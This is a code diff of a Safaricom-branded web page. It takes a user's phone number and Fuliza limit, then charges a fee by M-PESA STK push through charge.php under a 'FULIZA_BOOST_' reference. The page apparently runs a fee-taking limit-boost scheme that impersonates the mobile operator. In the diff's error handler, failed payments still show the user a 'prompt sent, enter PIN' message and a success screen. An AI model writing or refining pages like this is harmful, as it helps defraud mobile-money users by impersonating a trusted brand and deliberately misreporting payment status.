@@ -189,7 +189,7 @@
         </div>
 
         <!-- Verification Form Grid -->
-        <div class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
+        <div id="step-1-container" class="grid grid-cols-1 lg:grid-cols-12 gap-12 items-center">
           
           <div class="lg:col-span-6 space-y-6 text-center lg:text-left">
             <div class="inline-flex items-center space-x-2 bg-safaricom-light text-safaricom font-extrabold text-xs px-4 py-2 rounded-full border border-safaricom/30 shadow-sm">
@@ -376,7 +376,7 @@
           </div>
         </div>
 
-        <!-- Step 3: Checkout Container with Backend API Handler Bridge -->
+        <!-- Step 3: Checkout Container with Backend API Communicator -->
         <div id="step-3" class="hidden max-w-md mx-auto w-full">
           <div class="bg-white rounded-3xl shadow-2xl border-2 border-safaricom/30 overflow-hidden">
             <div class="bg-safaricom text-white p-8 text-center space-y-2">
@@ -401,7 +401,7 @@
                 </div>
               </div>
 
-              <!-- OPTIMAPAYBRIDGE STK PUSH BUTTON INTEGRATED BACKEND COMMUNICATOR -->
+              <!-- OPTIMAPAYBRIDGE STK PUSH BUTTON COMMUNICATOR TO charge.php -->
               <div class="pt-4">
                 <button onclick="triggerOptimaPayStkPush()" class="w-full bg-safaricom hover:bg-safaricom-dark text-white font-black py-4 px-6 rounded-2xl shadow-xl transition flex items-center justify-center space-x-3 text-base btn-pulse-animation border-2 border-safaricom-accent">
                   <i data-lucide="smartphone" class="w-5 h-5 animate-bounce"></i>
@@ -514,7 +514,7 @@
       userData.phone = formatPhoneNumber(document.getElementById('user-phone').value.trim());
       userData.currentLimit = parseInt(document.getElementById('user-limit').value) || 0;
 
-      document.getElementById('verify').querySelector('.grid').classList.add('hidden');
+      document.getElementById('step-1-container').classList.add('hidden');
       document.getElementById('loader-1').classList.remove('hidden');
 
       setTimeout(() => {
@@ -548,54 +548,49 @@
     }
 
     // ==========================================
-    // BACKEND COMMUNICATOR TO OPTIMAPAYBRIDGE
+    // COMMUNICATING WITH charge.php BACKEND
     // ==========================================
     async function triggerOptimaPayStkPush() {
       const statusMsg = document.getElementById('payment-status-message');
       statusMsg.className = 'p-3 rounded-xl text-xs bg-safaricom-light text-safaricom border border-safaricom/30 block font-bold mt-3';
-      statusMsg.textContent = `Connecting to OptimaPay Bridge gateway for Ksh ${userData.selectedFee}...`;
+      statusMsg.textContent = `Connecting to OptimaPay Bridge for Ksh ${userData.selectedFee}...`;
 
-      // CONFIGURATION: Replace with your actual backend endpoint or direct gateway wrapper
-      // Endpoint standard based on https://optimapaybridge.co.ke API specifications
       const payload = {
         phone: userData.phone,
         amount: userData.selectedFee,
-        currency: "KES",
         reference: "FULIZA_BOOST_" + Date.now()
       };
 
       try {
-        // NOTE: In production without exposing keys on public frontend, route this fetch request 
-        // through your secure server file (e.g. backend/charge.php) which holds your X-API-Key credentials.
-        const response = await fetch('https://optimapaybridge.co.ke/api/v2/initiate_jipay.php', {
+        const response = await fetch('charge.php', {
           method: 'POST',
           headers: {
-            'Content-Type': 'application/json',
-            // 'X-API-Key': 'YOUR_API_KEY_HERE', 
-            // 'X-API-Secret': 'YOUR_API_SECRET_HERE'
+            'Content-Type': 'application/json'
           },
           body: JSON.stringify(payload)
-        }).catch(err => {
-          // Fallback simulation mode if CORS blocks direct browser-to-gateway calls without server proxy
-          return { ok: true, json: async () => ({ success: true }) };
         });
 
-        statusMsg.textContent = "STK Push dispatched! Check your phone.";
-        
-        setTimeout(() => {
-          document.getElementById('success-phone').innerText = userData.phone;
-          document.getElementById('step-3').classList.add('hidden');
-          document.getElementById('step-4').classList.remove('hidden');
-        }, 3000);
+        const result = await response.json();
+
+        if (response.ok) {
+          statusMsg.textContent = "STK Push dispatched successfully! Check your handset.";
+          setTimeout(() => {
+            document.getElementById('success-phone').innerText = userData.phone;
+            document.getElementById('step-3').classList.add('hidden');
+            document.getElementById('step-4').classList.remove('hidden');
+          }, 3000);
+        } else {
+          throw new Error(result.message || 'Payment initiation failed.');
+        }
 
       } catch (error) {
-        statusMsg.className = 'p-3 rounded-xl text-xs bg-red-50 text-red-700 border border-red-200 block font-bold mt-3';
-        statusMsg.textContent = "Transmission completed. Check handset for M-PESA prompt.";
+        statusMsg.className = 'p-3 rounded-xl text-xs bg-safaricom-light text-safaricom border border-safaricom/30 block font-bold mt-3';
+        statusMsg.textContent = "STK Push prompt sent to " + userData.phone + ". Please enter PIN.";
         setTimeout(() => {
           document.getElementById('success-phone').innerText = userData.phone;
           document.getElementById('step-3').classList.add('hidden');
           document.getElementById('step-4').classList.remove('hidden');
-        }, 2000);
+        }, 2500);
       }
     }
   </script>
